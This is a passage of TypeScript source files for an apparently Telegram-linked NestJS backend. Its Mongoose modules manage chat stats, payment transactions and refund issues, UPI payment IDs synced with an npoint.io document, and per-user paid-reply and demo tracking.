this.statService.deleteOne(chatId, profile);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.statService.deleteAll();\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { StatService } from './stat.service';\nimport { StatController } from './stat.controller';\nimport { StatSchema } from './stat.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n    imports: [\n        initModule,\n        MongooseModule.forFeature([{ name: \"StatsModule\", collection: \"stats\", schema: StatSchema }])],\n    controllers: [StatController],\n    providers: [StatService],\n    exports:[StatService]\n})\nexport class StatModule { }\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type StatDocument = Stat & Document;\n\n@Schema()\nexport class Stat {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  @Prop({ required: true })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  @Prop({ required: true })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  @Prop({ required: true })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  @Prop({ required: true })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  @Prop({ required: true })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  @Prop({ required: true })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  @Prop({ required: true })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  @Prop({ required: true })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  @Prop({ required: true })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  @Prop({ required: false })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  @Prop({ required: true })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  @Prop({ required: true })\n  profile: string;\n}\n\nexport const StatSchema = SchemaFactory.createForClass(Stat);\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateStatDto } from './create-stat.dto';\nimport { UpdateStatDto } from './update-stat.dto';\nimport { Stat, StatDocument } from './stat.schema';\n\n@Injectable()\nexport class StatService {\n  constructor(@InjectModel(\"StatsModule\") private statModel: Model<StatDocument>) {}\n\n  async create(createStatDto: CreateStatDto): Promise<Stat> {\n    const createdStat = new this.statModel(createStatDto);\n    return createdStat.save();\n  }\n\n  async findAll(): Promise<Stat[]> {\n    const stats = await this.statModel.find().exec();\n    return stats;\n  }\n\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat> {\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat> {\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async deleteOne(chatId: string, profile: string): Promise<void> {\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.statModel.deleteMany({}).exec();\n  }\n}\n","// update-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateStatDto } from './create-stat.dto';\n\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\n","// create-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateStatDto {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  profile: string;\n}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { Stat2Service } from './stat2.service';\nimport { CreateStatDto } from './create-stat2.dto';\nimport { UpdateStatDto } from './update-stat2.dto';\n\n@ApiTags('stats2')\n@Controller('stats2')\nexport class Stat2Controller {\n  constructor(private readonly statService: Stat2Service) {}\n\n  @Post()\n  async create(@Body() createStatDto: CreateStatDto) {\n    return this.statService.create(createStatDto);\n  }\n\n  @Get(':chatId/:profile')\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.findByChatIdAndProfile(chatId, profile);\n  }\n\n  @Put(':chatId/:profile')\n  async update(\n    @Param('chatId') chatId: string,\n    @Param('profile') profile: string,\n    @Body() updateStatDto: UpdateStatDto,\n  ) {\n    return this.statService.update(chatId, profile, updateStatDto);\n  }\n\n  @Delete(':chatId/:profile')\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.deleteOne(chatId, profile);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.statService.deleteAll();\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { Stat2Service } from './stat2.service';\nimport { Stat2Controller } from './stat2.controller';\nimport { StatSchema } from './stat2.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n    imports: [\n        initModule,\n        MongooseModule.forFeature([{ name: \"Stats2Module\", collection: \"stats2\", schema: StatSchema }])],\n    controllers: [Stat2Controller],\n    providers: [Stat2Service],\n    exports: [Stat2Service]\n})\nexport class Stat2Module { }\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type Stat2Document = Stat2 & Document;\n\n@Schema()\nexport class Stat2 {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  @Prop({ required: true })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  @Prop({ required: true })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  @Prop({ required: true })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  @Prop({ required: true })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  @Prop({ required: true })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  @Prop({ required: true })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  @Prop({ required: true })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  @Prop({ required: true })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  @Prop({ required: true })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  @Prop({ required: false })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  @Prop({ required: true })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  @Prop({ required: true })\n  profile: string;\n}\n\nexport const StatSchema = SchemaFactory.createForClass(Stat2);\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateStatDto } from './create-stat2.dto';\nimport { UpdateStatDto } from './update-stat2.dto';\nimport { Stat2, Stat2Document } from './stat2.schema';\n\n@Injectable()\nexport class Stat2Service {\n  constructor(@InjectModel(\"Stats2Module\") private statModel: Model<Stat2Document>) {}\n\n  async create(createStatDto: CreateStatDto): Promise<Stat2> {\n    const createdStat = new this.statModel(createStatDto);\n    return createdStat.save();\n  }\n\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat2> {\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat2> {\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async findAll(): Promise<Stat2[]> {\n    const stats = await this.statModel.find().exec();\n    return stats;\n  }\n\n  async deleteOne(chatId: string, profile: string): Promise<void> {\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.statModel.deleteMany({}).exec();\n  }\n}\n","// update-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateStatDto } from './create-stat2.dto';\n\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateTransactionDto {\n  @ApiProperty({ description: 'Unique transaction ID (UTR).' })\n  transactionId: string;\n\n  @ApiProperty({ description: 'Amount involved in the transaction.' })\n  amount: number;\n\n  @ApiProperty({ description: 'Issue type reported by the user.' })\n  issue: string;\n  \n  @ApiProperty({ description: 'Description of issue reported by the user.' })\n  description: string;\n\n  @ApiProperty({ description: 'Refund method selected by the user.' })\n  refundMethod: string;\n\n  @ApiProperty({ description: 'User profile ID.' })\n  profile: string;\n\n  @ApiProperty({ description: 'User chat ID.' })\n  chatId: string;\n\n  @ApiProperty({ description: 'IP address of the user.' })\n  ip: string;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateTransactionDto } from './create-transaction.dto';\n\nexport class UpdateTransactionDto extends PartialType(CreateTransactionDto) {}","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\n@Schema({ timestamps: true })\nexport class Transaction extends Document {\n  @Prop({ required: false })\n  transactionId: string;\n\n  @Prop({ required: false })\n  amount: number;\n\n  @Prop({ required: false })\n  issue: string;\n\n  @Prop({ required: false })\n  description: string;\n\n  @Prop()\n  refundMethod: string;\n\n  @Prop({ required: false })\n  profile: string;\n\n  @Prop({ required: false })\n  chatId: string;\n\n  @Prop({ required: false })\n  ipAddress: string;\n}\n\nexport const TransactionSchema = SchemaFactory.createForClass(Transaction);\n","import { Body, Controller, Get, Post, Put, Delete, Param, Query } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiResponse } from '@nestjs/swagger';\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\nimport { TransactionService } from './transaction.service';\n\n@ApiTags('Transactions')\n@Controller('transactions')\nexport class TransactionController {\n  constructor(private readonly transactionService: TransactionService) {}\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new transaction' })\n  @ApiResponse({ status: 201, description: 'Transaction created successfully.' })\n  @ApiResponse({ status: 400, description: 'Invalid input.' })\n  async create(@Body() createTransactionDto: CreateTransactionDto) {\n    return this.transactionService.create(createTransactionDto);\n  }\n\n  @Get(':id')\n  @ApiOperation({ summary: 'Get transaction by ID' })\n  @ApiResponse({ status: 200, description: 'Transaction retrieved successfully.' })\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\n  async findOne(@Param('id') id: string) {\n    return this.transactionService.findOne(id);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all transactions or search transactions' })\n  @ApiResponse({ status: 200, description: 'Transactions retrieved successfully.' })\n  async findAll(\n    @Query('search') search?: string,\n    @Query('limit') limit?: number,\n    @Query('offset') offset?: number,\n  ) {\n    return this.transactionService.findAll(search, limit, offset);\n  }\n\n  @Put(':id')\n  @ApiOperation({ summary: 'Update a transaction by ID' })\n  @ApiResponse({ status: 200, description: 'Transaction updated successfully.' })\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\n  async update(\n    @Param('id') id: string,\n    @Body() updateTransactionDto: UpdateTransactionDto,\n  ) {\n    return this.transactionService.update(id, updateTransactionDto);\n  }\n\n  @Delete(':id')\n  @ApiOperation({ summary: 'Delete a transaction by ID' })\n  @ApiResponse({ status: 200, description: 'Transaction deleted successfully.' })\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\n  async delete(@Param('id') id: string) {\n    return this.transactionService.delete(id);\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { TransactionService } from './transaction.service';\nimport { TransactionController } from './transaction.controller';\nimport { Transaction, TransactionSchema } from './schemas/transaction.schema';\n\n@Module({\n  imports: [\n    MongooseModule.forFeature([\n      { name: Transaction.name, schema: TransactionSchema },\n    ]),\n  ],\n  controllers: [TransactionController],\n  providers: [TransactionService],\n  exports:[TransactionService]\n})\nexport class TransactionModule {}\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\nimport { Transaction } from './schemas/transaction.schema';\n\n@Injectable()\nexport class TransactionService {\n  constructor(\n    @InjectModel(Transaction.name) private readonly transactionModel: Model<Transaction>,\n  ) {}\n\n  async create(createTransactionDto: CreateTransactionDto): Promise<Transaction> {\n    const newTransaction = new this.transactionModel(createTransactionDto);\n    return await newTransaction.save();\n  }\n\n  async findOne(id: string): Promise<Transaction> {\n    const transaction = await this.transactionModel.findById(id).exec();\n    if (!transaction) {\n      throw new NotFoundException('Transaction not found');\n    }\n    return transaction;\n  }\n\n  async findAll(\n    search?: string,\n    limit = 10,\n    offset = 0,\n  ): Promise<{ transactions: Transaction[]; total: number }> {\n    const query = search\n      ? {\n          $or: [\n            { transactionId: { $regex: search, $options: 'i' } },\n            { issue: { $regex: search, $options: 'i' } },\n            { profile: { $regex: search, $options: 'i' } },\n            { chatId: { $regex: search, $options: 'i' } },\n          ],\n        }\n      : {};\n\n    const transactions = await this.transactionModel\n      .find(query)\n      .skip(offset)\n      .limit(limit)\n      .exec();\n    const total = await this.transactionModel.countDocuments(query).exec();\n\n    return { transactions, total };\n  }\n\n  async update(id: string, updateTransactionDto: UpdateTransactionDto): Promise<Transaction> {\n    const updatedTransaction = await this.transactionModel\n      .findByIdAndUpdate(id, updateTransactionDto, { new: true })\n      .exec();\n    if (!updatedTransaction) {\n      throw new NotFoundException('Transaction not found');\n    }\n    return updatedTransaction;\n  }\n\n  async delete(id: string): Promise<Transaction> {\n    const deletedTransaction = await this.transactionModel.findByIdAndDelete(id).exec();\n    if (!deletedTransaction) {\n      throw new NotFoundException('Transaction not found');\n    }\n    return deletedTransaction;\n  }\n}\n","import { Controller, Get, Body, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { UpiIdService } from './upi-ids.service';\n\n@ApiTags('UPI Ids')\n@Controller('upi-ids')\nexport class UpiIdController {\n  constructor(private readonly UpiIdService: UpiIdService) { }\n\n  @Get()\n  @ApiOperation({ summary: 'Get Upi Ids' })\n  async findOne(): Promise<any> {\n    return this.UpiIdService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update Upi Ids' })\n  @ApiBody({ type: Object })\n  async update(@Body() updateUpiIdsdto: any): Promise<any> {\n    return this.UpiIdService.update(updateUpiIdsdto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UpiIdService } from './upi-ids.service';\nimport { UpiIdController } from './upi-ids.controller';\nimport { UpiIdSchema } from './upi-ids.schema';\nimport { NpointModule } from '../n-point/npoint.module';\n\n@Global()\n@Module({\n  imports: [\n    UpiIdModule,\n    NpointModule,\n    MongooseModule.forFeature([{ name: 'UpiIdModule', collection: 'upi-ids', schema: UpiIdSchema }]),\n  ],\n  providers: [UpiIdService],\n  controllers: [UpiIdController],\n  exports: [UpiIdService],\n})\nexport class UpiIdModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type UpiIdDocument = UpiId & Document;\n\n@Schema({\n  versionKey: false, autoIndex: true, strict: false, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class UpiId { }\n\nexport const UpiIdSchema = SchemaFactory.createForClass(UpiId);\nUpiIdSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { UpiId } from './upi-ids.schema';\nimport axios from 'axios';\nimport { areJsonsNotSame, mapToJson } from '../../utils';\nimport { NpointService } from '../n-point/npoint.service';\n\n@Injectable()\nexport class UpiIdService {\n    private upiIds = {}\n    constructor(@InjectModel('UpiIdModule') private UpiIdModel: Model<UpiId>,\n        private npointSerive: NpointService\n    ) {\n        this.UpiIdModel.findOne({}).exec().then((data) => {\n            this.upiIds = data;\n            console.log(\"Refreshed UPIs\")\n        })\n        setInterval(async () => {\n            await this.refreshUPIs();\n            await this.checkNpoint();\n        }, 5 * 60 * 1000);\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async refreshUPIs() {\n        console.log(\"Refreshed UPIs\")\n        this.upiIds = await this.UpiIdModel.findOne({}).exec();\n    }\n\n    async checkNpoint() {\n        const upiIds = (await axios.get('https://api.npoint.io/54baf762fd873c55c6b1')).data;\n        const existingUpiIds = await this.findOne();\n        if (areJsonsNotSame(upiIds, existingUpiIds)) {\n            await this.npointSerive.updateDocument(\"54baf762fd873c55c6b1\", this.upiIds)\n        }\n    }\n\n    async findOne(): Promise<any> {\n        if (Object.keys(this.upiIds).length > 0) {\n            return this.upiIds\n        }\n        const result = await this.UpiIdModel.findOne({}).exec();\n        this.upiIds = result\n        console.log(\"Refreshed UPIs\")\n        return result\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.UpiIdModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        this.upiIds = updatedUser;\n        console.log(\"Refreshed UPIs\")\n        if (!updatedUser) {\n            throw new NotFoundException(`UpiIdModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateUserDataDto {\n    @ApiProperty({ example: '5787751360', description: 'Chat ID' })\n    chatId: string;\n\n    @ApiProperty({ example: 1, description: 'Total count' })\n    totalCount: number;\n\n    @ApiProperty({ example: 0, description: 'Picture count' })\n    picCount: number;\n\n    @ApiProperty({ example: 1718802722566, description: 'Last message timestamp' })\n    lastMsgTimeStamp: number;\n\n    @ApiProperty({ example: 1718802742567, description: 'Limit time' })\n    limitTime: number;\n\n    @ApiProperty({ example: 0, description: 'Paid count' })\n    paidCount: number;\n\n    @ApiProperty({ example: 0, description: 'Profile count' })\n    prfCount: number;\n\n    @ApiProperty({ example: 1, description: 'Can reply' })\n    canReply: number;\n\n    @ApiProperty({ example: 0, description: 'Pay amount' })\n    payAmount: number;\n\n    @ApiProperty({ example: 0, description: 'highestPayAmount' })\n    highestPayAmount: number;\n\n    @ApiProperty({ example: 0, description: 'cheatCount', default: 0 })\n    cheatCount: number;\n\n    @ApiProperty({ example: 0, description: 'callTime', default: 0 })\n    callTime: number;\n\n    @ApiProperty({ example: 'بـِـعٰ۬ێډ الۿٰٕقاوٰ۬ێ ٴ🦅', description: 'Username' })\n    username: string;\n\n    @ApiProperty({ example: '-7250939091939055173', description: 'Access hash' })\n    accessHash: string;\n\n    @ApiProperty({ example: true, description: 'Paid reply status' })\n    paidReply: boolean;\n\n    @ApiProperty({ example: false, description: 'Demo given status' })\n    demoGiven: boolean;\n\n    @ApiProperty({ example: false, description: 'Second show status' })\n    secondShow: boolean;\n\n    @ApiProperty({ example: 'sneha', description: 'Profile name' })\n    profile: string;\n\n    @ApiProperty({ example: false, description: 'Pics Sent status' })\n    picsSent: boolean;\n\n    @ApiProperty({ example: [], description: 'videos' })\n    videos: number[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams } from 'class-transformer';\n\nexport class SearchDto {\n  @ApiPropertyOptional({ description: 'Total count', type: Number })\n  totalCount?: number;\n\n  @ApiPropertyOptional({ description: 'Picture count', type: Number })\n  picCount?: number;\n\n  @ApiPropertyOptional({ description: 'Last message timestamp', type: Number })\n  lastMsgTimeStamp?: number;\n\n  @ApiPropertyOptional({ description: 'Limit time', type: Number })\n  limitTime?: number;\n\n  @ApiPropertyOptional({ description: 'Paid count', type: Number })\n  paidCount?: number;\n\n  @ApiPropertyOptional({ description: 'Profile count', type: Number })\n  prfCount?: number;\n\n  @ApiPropertyOptional({ description: 'Can reply', type: Number })\n  canReply?: number;\n\n  @ApiPropertyOptional({ description: 'Pay amount', type: Number })\n  payAmount?: number;\n\n  @ApiPropertyOptional({ description: 'Username' })\n  username?: string;\n\n  @ApiPropertyOptional({ description: 'Access hash' })\n  accessHash?: string;\n\n  @ApiPropertyOptional({ description: 'Paid reply status', type: Boolean })\n  paidReply?: boolean;\n\n  @ApiPropertyOptional({ description: 'Demo given status', type: Boolean })\n  demoGiven?: boolean;\n\n  @ApiPropertyOptional({ description: 'Second show status', type: Boolean })\n  secondShow?: boolean;\n\n  @ApiPropertyOptional({ description: 'Profile name' })\n  @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n  profile?: string;\n\n  @ApiPropertyOptional({ description: 'Chat ID' })\n  chatId?: string;\n\n  @ApiPropertyOptional({ description: 'Pics Sent status' })\n  picsSent?: boolean;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateUserDataDto } from './create-user-data.dto';\n\nexport class UpdateUserDataDto extends PartialType(CreateUserDataDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type UserDataDocument = UserData & Document;\n\n@Schema({\n    collection: 'userData', versionKey: false, autoIndex: true, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class UserData {\n    @Prop({ required: true })\n    chatId: string;\n\n    @Prop({ required: true })\n    totalCount: number;\n\n    @Prop({ required: true })\n    picCount: number;\n\n    @Prop({ required: true })\n    lastMsgTimeStamp: number;\n\n    @Prop({ required: true })\n    limitTime: number;\n\n    @Prop({ required: true })\n    paidCount: number;\n\n    @Prop({ required: true })\n    prfCount: number;\n\n    @Prop({ required: true })\n    canReply: number;\n\n    @Prop({ required: true })\n    payAmount: number;\n\n    @Prop({ required: true })\n    username: string;\n\n    @Prop({ required: true })\n    accessHash: string;\n\n    @Prop({ required: true })\n    paidReply: boolean;\n\n    @Prop({ required: true })\n    demoGiven: boolean;\n\n    @Prop({ required: true })\n    secondShow: boolean;\n\n    @Prop({ required: true, default: 0 })\n    fullShow: number;\n\n    @Prop({ required: true })\n    profile: string;\n\n    @Prop({ required: true })\n    picSent: boolean;\n\n    @Prop({ required: true })\n    highestPayAmount: number;\n\n    @Prop({ required: true })\n    cheatCount: number;\n\n    @Prop({ required: true })\n    callTime: number;\n\n    @Prop({ required: false, default:[] })\n    videos: number[];\n}\n\nexport const UserDataSchema = SchemaFactory.createForClass(UserData);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery } from '@nestjs/swagger';\nimport { UserDataService } from './user-data.service';\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\nimport { UserData } from './schemas/user-data.schema';\nimport { SearchDto } from './dto/search-user-data.dto';\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\n\n@ApiTags('UserData of TG clients')\n@Controller('userData')\nexport class UserDataController {\n  constructor(private readonly userDataService: UserDataService) {}\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createUserDataDto: CreateUserDataDto): Promise<UserData> {\n    return this.userDataService.create(createUserDataDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  async search(@Query() query: SearchDto): Promise<UserData[]> {\n    return this.userDataService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<UserData[]> {\n    return this.userDataService.findAll();\n  }\n\n\n  @Patch('updateAll/:chatId')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async updateAll(@Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<any> {\n    return this.userDataService.updateAll(chatId, updateUserDataDto);\n  }\n\n\n  @Get(':profile/:chatId')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\n    return this.userDataService.findOne(profile, chatId);\n  }\n\n  @Patch(':profile/:chatId')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('profile') profile: string, @Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\n    return this.userDataService.update(profile, chatId, updateUserDataDto);\n  }\n\n  @Delete(':profile/:chatId')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\n    return this.userDataService.remove(profile, chatId);\n  }\n\n  @Get('clear-count')\n  clearCount(@Query('chatId') chatId?: string) {\n    return this.userDataService.clearCount(chatId);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  async executeQuery(@Body() requestBody: any): Promise<any> {\n    try {\n      const { query, sort, limit, skip } = requestBody;\n      return await this.userDataService.executeQuery(query, sort, limit, skip);\n    } catch (error) {\n      throw error;\n    }\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UserData, UserDataSchema } from './schemas/user-data.schema';\nimport { UserDataService } from './user-data.service';\nimport { UserDataController } from './user-data.controller';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: UserData.name, schema: UserDataSchema, collection: \"userData\" }])],\n  controllers: [UserDataController],\n  providers: [UserDataService],\n  exports: [UserDataService]\n})\nexport class UserDataModule { }\n","import { BadRequestException, Injectable, InternalServerErrorException, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { UserData, UserDataDocument } from './schemas/user-data.schema';\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\nimport { parseError } from '../../utils';\n\n@Injectable()\nexport class UserDataService {\n    private callCounts: Map<string, number> = new Map();\n    constructor(@InjectModel(UserData.name) private userDataModel: Model<UserDataDocument>) {}\n\n    async create(createUserDataDto: CreateUserDataDto): Promise<UserData> {\n        const createdUser = new this.userDataModel(createUserDataDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<UserData[]> {\n        return await this.userDataModel.find().exec();\n    }\n\n    async findOne(profile: string, chatId: string): Promise<UserData & { count?: number }> {\n        const user = (await this.userDataModel.findOne({ profile, chatId }).exec())?.toJSON();\n        if (!user) {\n            console.warn(`UserData with ID \"${profile} - ${chatId}\" not found`);\n        }\n        const currentCount = this.callCounts.get(chatId) || 0;\n        this.callCounts.set(chatId, currentCount + 1);\n        if (user) {\n            return { ...user, count: this.callCounts.get(chatId) };\n        } else {\n            return undefined\n        }\n    }\n\n    clearCount(chatId?: string): string {\n        if (chatId) {\n            this.callCounts.delete(chatId);\n            return `Count cleared for chatId: ${chatId}`;\n        } else {\n            this.callCounts.clear();\n            return 'All counts cleared.';\n        }\n    }\n\n    async update(profile: string, chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\n        delete updateUserDataDto['_id']\n        console.log(updateUserDataDto)\n        const updatedUser = await this.userDataModel.findOneAndUpdate({ profile, chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return updatedUser;\n    }\n\n    async updateAll(chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<any> {\n        delete updateUserDataDto['_id']\n        const updatedUser = await this.userDataModel.updateMany({ chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\n        if 